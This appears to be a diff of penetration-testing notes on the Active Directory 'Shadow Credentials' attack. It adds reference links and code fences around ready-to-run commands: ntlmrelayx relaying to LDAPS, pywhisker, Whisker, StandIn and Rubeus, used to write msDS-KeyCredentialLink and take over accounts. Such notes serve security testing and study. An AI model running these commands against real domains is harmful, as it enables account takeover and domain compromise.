@@ -8,6 +8,12 @@ https://github.com/topotam/PetitPotam
 #
 https://github.com/ShutdownRepo/pywhisker
 #
+https://k4713.medium.com/k4713-on-shadow-credentials-attack-57474d84ef69
+#
+https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
+#
+https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
+#
 ##
 
 Shadow Credentials 
@@ -35,16 +41,19 @@ NTLM relay to LDAP and open an interactive LDAP shell (source). When relaying a 
 
 impacket
 Requires PR 1402.
-
+```
 impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --interactive --target ldaps://dc01.corp.local
 $ nc -v 127.0.0.1 11000
 # set_shadow_creds jdoeadm
 # clear_shadow_creds jdoeadm
 # exit
+```
 NTLM relay to LDAP. Requires manual cleanup.
 
 impacket
+```
 impacket-ntlmrelayx --no-dump --no-da --no-acl --no-validate-privs --no-smb-server --no-wcf-server --no-raw-server --http-port 8080 --shadow-credentials --shadow-target jdoeadm --target ldaps://dc01.corp.local
+```
 Untested tools:
 
 Whisker, written in C#
@@ -90,12 +99,14 @@ UNIX-like
 Windows
 From UNIX-like systems, the msDs-KeyCredentialLink attribute of a user or computer target can be manipulated with the pyWhisker tool.
 
-Copy
+```
 pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
+```
 The "add" action from pywhisker is featured in ntlmrelayx.
 
-Copy
+```
 ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
+```
 When the public key has been set in the msDs-KeyCredentialLink of the target, the certificate generated can be used with Pass-the-Certificate to obtain a TGT and further access.
 
 Nota bene
@@ -122,7 +133,7 @@ That makes GenericWrite on a user effectively equal to DCSync right on that user
 
 Remember that WriteDacl != GenericWrite, so in order to modify msDS-KeyCredentialLink, obtain necessary privileges first. For example, using StandIn:
 
-Copy
+```
 Cmd > Rubeus.exe createnetonly /program:cmd.exe /show /ticket:tgt.kirbi
 Cmd > StandIn.exe --domain megacorp.local --object "samaccountname=snovvcrash" --grant "MEGACORP\jdoe" --type GenericAll
 DSInternals
@@ -132,14 +143,13 @@ Whisker
 https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab
 
 https://github.com/eladshamir/Whisker
-
+```
 List all the values of the the msDS-KeyCredentialLink attribute of a target object:
 
-Copy
+```
 Cmd > .\Whisker.exe list /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local
 Add a new value to the msDS-KeyCredentialLink attribute of a target object:
 
-Copy
 Cmd > .\Whisker.exe add /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local /path:C:\Temp\cert.pfx /password:Passw0rd!
 Remove a value from the msDS-KeyCredentialLink attribute of a target object:
 
@@ -151,7 +161,7 @@ Copy
 Cmd > .\Whisker.exe clear /target:ws01$ /domain:megacorp.local /dc:DC1.megacorp.local 
 pywhisker
 https://github.com/ShutdownRepo/pywhisker
-
+```
 https://podalirius.net/en/articles/parsing-the-msds-keycredentiallink-value-for-shadowcredentials-attack/
 
 ```
